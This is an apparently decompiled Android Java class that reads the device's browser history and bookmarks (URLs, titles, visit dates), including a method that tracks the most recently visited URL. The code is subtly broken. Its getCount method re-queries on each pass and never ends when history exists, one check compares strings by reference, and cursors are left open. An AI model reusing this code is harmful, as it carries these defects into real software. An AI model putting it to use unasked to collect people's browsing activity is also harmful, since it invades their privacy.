package iits.code.dao;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.Browser;
import android.util.Log;
import iits.code.dto.URL_DTO;
import iits.mamager.FileManager;
import java.util.ArrayList;

public class URL_History_DAO {
    private static final String TAG = "URL_History_DAO";

    public static ArrayList<URL_DTO> getAlls(ContentResolver cr) {
        try {
            ArrayList<URL_DTO> arrURL = new ArrayList<>();
            Cursor c = cr.query(Browser.BOOKMARKS_URI, null, null, null, null);
            while (c.moveToNext()) {
                URL_DTO url = new URL_DTO();
                url.setID(c.getLong(c.getColumnIndex("_id")));
                url.setTime(c.getLong(c.getColumnIndex("date")));
                url.setTitle(c.getString(c.getColumnIndex(URL_DAO.KEY_TITLE)));
                url.setURL(c.getString(c.getColumnIndex(URL_DAO.KEY_URL)));
                url.setBookMark(c.getInt(c.getColumnIndex(URL_DAO.KEY_BOOKMARK)));
                arrURL.add(url);
            }
            return arrURL;
        } catch (Exception e) {
            Log.e(TAG, "Error on getAlls function: " + e.toString());
            return null;
        }
    }

    public static URL_DTO getURLLast(ContentResolver cr) {
        Exception e;
        URL_DTO url = null;
        try {
            Cursor c = cr.query(Browser.BOOKMARKS_URI, null, null, null, "_id DESC");
            if (c.moveToNext()) {
                URL_DTO url2 = new URL_DTO();
                try {
                    url2.setID(c.getLong(c.getColumnIndex("_id")));
                    url2.setTime(c.getLong(c.getColumnIndex("date")));
                    url2.setTitle(c.getString(c.getColumnIndex(URL_DAO.KEY_TITLE)));
                    url2.setURL(c.getString(c.getColumnIndex(URL_DAO.KEY_URL)));
                    url2.setBookMark(c.getInt(c.getColumnIndex(URL_DAO.KEY_BOOKMARK)));
                    url = url2;
                } catch (Exception e2) {
                    e = e2;
                    Log.e(TAG, "Error on getURLLast function: " + e.toString());
                    return null;
                }
            }
            return url;
        } catch (Exception e3) {
            e = e3;
            Log.e(TAG, "Error on getURLLast function: " + e.toString());
            return null;
        }
    }

    /* JADX INFO: Multiple debug info for r9v7 android.database.Cursor: [D('cr' android.content.ContentResolver), D('c' android.database.Cursor)] */
    public static URL_DTO getAccessLastURL(ContentResolver cr, long oldDate) {
        Exception e;
        try {
            long date = System.currentTimeMillis();
            Cursor c = cr.query(Browser.BOOKMARKS_URI, null, null, null, "date DESC");
            while (c.moveToNext()) {
                long newDate = c.getLong(c.getColumnIndex("date"));
                if (newDate <= date) {
                    String title = c.getString(c.getColumnIndex(URL_DAO.KEY_TITLE));
                    String url_link = c.getString(c.getColumnIndex(URL_DAO.KEY_URL));
                    if (title == url_link) {
                        return null;
                    }
                    if (newDate == oldDate) {
                        return null;
                    }
                    URL_DTO url = new URL_DTO();
                    try {
                        url.setID(c.getLong(c.getColumnIndex("_id")));
                        url.setTime(newDate);
                        url.setTitle(title);
                        url.setURL(url_link);
                        url.setBookMark(c.getInt(c.getColumnIndex(URL_DAO.KEY_BOOKMARK)));
                        return url;
                    } catch (Exception e2) {
                        e = e2;
                        FileManager.WriteLog(3, TAG, "Error on getAccessLastURL function: " + e.toString());
                        return null;
                    }
                }
            }
            return null;
        } catch (Exception e3) {
            e = e3;
            FileManager.WriteLog(3, TAG, "Error on getAccessLastURL function: " + e.toString());
            return null;
        }
    }

    public static int getCount(ContentResolver cr) {
        try {
            int count = 0;
            while (cr.query(Browser.BOOKMARKS_URI, null, null, null, null).moveToNext()) {
                count++;
            }
            return count;
        } catch (Exception e) {
            Log.e(TAG, "Error on getCount function: " + e.toString());
            return 0;
        }
    }
}
